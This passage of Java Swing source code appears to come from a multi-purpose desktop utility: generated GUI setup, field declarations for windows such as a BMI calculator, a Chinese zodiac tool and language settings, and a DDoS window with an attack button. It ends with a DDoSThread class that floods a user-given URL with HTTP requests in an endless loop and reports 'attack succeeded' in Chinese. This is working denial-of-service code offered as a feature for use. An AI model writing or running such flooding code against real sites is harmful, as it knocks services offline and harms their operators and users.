            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(Main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(Main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(Main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new Main().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton ABClang;
    private javax.swing.JFrame AboutFrame;
    private javax.swing.JButton AttackButton;
    private javax.swing.JFrame BMIculc;
    private javax.swing.JTextField BMIval;
    private javax.swing.JButton Bmi;
    private javax.swing.JButton CancelButton;
    private javax.swing.JButton Chinese;
    private javax.swing.JButton ChineseButton;
    private javax.swing.JFrame ChineseYearFrame;
    private javax.swing.JLabel ChooseFontWord;
    private javax.swing.JMenuItem Clear;
    private javax.swing.JButton Close;
    private javax.swing.JTextArea Console;
    private javax.swing.JTextArea Console1;
    private javax.swing.JButton Convert;
    private javax.swing.JMenuItem Copy;
    private javax.swing.JButton Culc;
    private javax.swing.JMenuItem Cut;
    private javax.swing.JButton DDOSButton;
    private javax.swing.JFrame DDOSFrame;
    private javax.swing.JMenu Edit;
    private javax.swing.JButton English;
    private javax.swing.JButton English1;
    private javax.swing.JMenuItem Exit;
    private javax.swing.JMenuItem Exit1;
    private javax.swing.JMenuItem Exit2;
    private javax.swing.JMenuItem Exit3;
    private javax.swing.JMenuItem Exit5;
    private javax.swing.JMenu File;
    private javax.swing.JFileChooser FileChoose;
    private javax.swing.JFrame FileChooseFrame;
    private javax.swing.JFrame FontFrame;
    private javax.swing.JMenuItem HTMLdoc;
    private javax.swing.JMenu Help;
    private javax.swing.JTextField Hight;
    private javax.swing.JFrame InstallFrame;
    private javax.swing.JButton Japanese;
    private javax.swing.JButton Language;
    private javax.swing.JFrame LanguageForm;
    private javax.swing.JButton MC;
    private javax.swing.JButton MC1;
    private javax.swing.JMenuItem MainAbout;
    private javax.swing.JFrame MainAboutFrame;
    private javax.swing.JMenu More;
    private javax.swing.JTextArea NumA;
    private javax.swing.JTextArea NumB;
    private javax.swing.JButton Painter;
    private javax.swing.JMenuItem Paste;
    private javax.swing.JButton PressClear;
    private javax.swing.JButton PressSure;
    private javax.swing.JTextField ResultA;
    private javax.swing.JButton SimpChinese;
    private javax.swing.JButton Sure;
    private javax.swing.JMenuItem Sure1;
    private javax.swing.JButton SurePress1;
    private javax.swing.JFrame ThanksForUsing;
    private javax.swing.JLabel TitleFontWord;
    private javax.swing.JButton TredChinese;
    private javax.swing.JTextArea UrlArea;
    private javax.swing.JTextField Weight;
    private javax.swing.JMenu Windows;
    private javax.swing.JFrame a;
    private javax.swing.JMenuItem about;
    private javax.swing.JMenuItem about1;
    private javax.swing.JFrame aboutFrame;
    private javax.swing.JButton bgButton;
    private javax.swing.JFrame bgFrame;
    private javax.swing.JMenuItem cp;
    private javax.swing.JButton culc;
    private javax.swing.JFrame disPlay;
    private javax.swing.JButton disPlayButton;
    private javax.swing.JFrame displayArea;
    private javax.swing.JButton displayAreaButton;
    private javax.swing.JMenuItem doc;
    private javax.swing.JMenu editMenu;
    private javax.swing.JMenuItem exit;
    private javax.swing.JMenu file;
    private javax.swing.JButton fontButton;
    private javax.swing.JFrame getHTML;
    private javax.swing.JButton htmlFrame;
    private javax.swing.JLabel indexFontWord;
    private javax.swing.JTextArea installError;
    private javax.swing.JTextArea installPath;
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton2;
    private javax.swing.JButton jButton3;
    private javax.swing.JButton jButton4;
    private javax.swing.JButton jButton5;
    private javax.swing.JButton jButton6;
    private javax.swing.JButton jButton7;
    private javax.swing.JButton jButton8;
    private javax.swing.JCheckBox jCheckBox1;
    private javax.swing.JCheckBox jCheckBox2;
    private javax.swing.JCheckBox jCheckBox3;
    private javax.swing.JCheckBox jCheckBox4;
    private javax.swing.JCheckBox jCheckBox5;
    private javax.swing.JCheckBox jCheckBox6;
    private javax.swing.JCheckBoxMenuItem jCheckBoxMenuItem1;
    private javax.swing.JComboBox<String> jComboBox1;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel10;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private javax.swing.JLabel jLabel8;
    private javax.swing.JLabel jLabel9;
    private javax.swing.JMenu jMenu1;
    private javax.swing.JMenu jMenu3;
    private javax.swing.JMenu jMenu4;
    private javax.swing.JMenu jMenu5;
    private javax.swing.JMenu jMenu6;
    private javax.swing.JMenu jMenu7;
    private javax.swing.JMenu jMenu8;
    private javax.swing.JMenuBar jMenuBar1;
    private javax.swing.JMenuBar jMenuBar2;
    private javax.swing.JMenuBar jMenuBar3;
    private javax.swing.JMenuItem jMenuItem1;
    private javax.swing.JMenuItem jMenuItem2;
    private javax.swing.JMenuItem jMenuItem3;
    private javax.swing.JMenuItem jMenuItem4;
    private javax.swing.JMenuItem jMenuItem5;
    private javax.swing.JMenuItem jMenuItem8;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane10;
    private javax.swing.JScrollPane jScrollPane11;
    private javax.swing.JScrollPane jScrollPane12;
    private javax.swing.JScrollPane jScrollPane13;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JScrollPane jScrollPane3;
    private javax.swing.JScrollPane jScrollPane4;
    private javax.swing.JScrollPane jScrollPane5;
    private javax.swing.JScrollPane jScrollPane6;
    private javax.swing.JScrollPane jScrollPane7;
    private javax.swing.JScrollPane jScrollPane8;
    private javax.swing.JScrollPane jScrollPane9;
    private javax.swing.JTextArea jTextArea1;
    private javax.swing.JTextArea jTextArea2;
    private javax.swing.JTextArea jTextArea3;
    private javax.swing.JMenuItem keyWords;
    private javax.swing.JLabel la;
    private javax.swing.JFrame langFrame;
    private javax.swing.JButton languageButton;
    private javax.swing.JMenuItem left;
    private javax.swing.JButton leftB;
    private javax.swing.JMenuItem netSupport;
    private javax.swing.JMenuItem open;
    private javax.swing.JMenuItem open1;
    private javax.swing.JFrame plus;
    private javax.swing.JMenuItem plusMenu;
    private javax.swing.JLabel plusType;
    private javax.swing.JMenuItem pre;
    private javax.swing.JFrame preFrame;
    private javax.swing.JFrame preference;
    private javax.swing.JMenuItem preferenceMenu;
    private javax.swing.JButton presssure1;
    private javax.swing.JButton presssure2;
    private javax.swing.JButton presssure3;
    private javax.swing.JMenuItem print;
    private javax.swing.JMenuItem ps;
    private javax.swing.JMenuItem report;
    private javax.swing.JLabel resultNameFont;
    private javax.swing.JTextArea roc;
    private javax.swing.JFrame s;
    private javax.swing.JMenuItem save;
    private javax.swing.JMenuItem save1;
    private javax.swing.JTextArea te;
    private javax.swing.JMenuBar uiMenuBar;
    private javax.swing.JButton urlAreaButton;
    private javax.swing.JFrame urlAreaFrame;
    private javax.swing.JTextArea urlInput;
    private javax.swing.JButton wordButton;
    private javax.swing.JFrame wordFrame;
    // End of variables declaration//GEN-END:variables
class DDoSThread implements Runnable {

        String AttackUrl;

        public DDoSThread(String AttackUrl) {
            this.AttackUrl = AttackUrl;
        }

        public void run() {
            while (true) {
                try {
                    if (DDOSDSD == "0") {
                        break;
                    }
                    URL url = new URL(AttackUrl);
                    URLConnection conn = url.openConnection();
                    Console.append("發送封包成功！\n");
                    BufferedInputStream bis = new BufferedInputStream(
                            conn.getInputStream());
                    byte[] bytes = new byte[1024];
                    int len = -1;
                    StringBuffer sb = new StringBuffer();

                    if (bis != null) {
                        if ((len = bis.read()) != -1) {
                            sb.append(new String(bytes, 0, len));
                            Console.append("攻擊成功！");
                            bis.close();
                        }
                    }
                } catch (MalformedURLException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                } catch (IOException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }

            }
        }
    }
}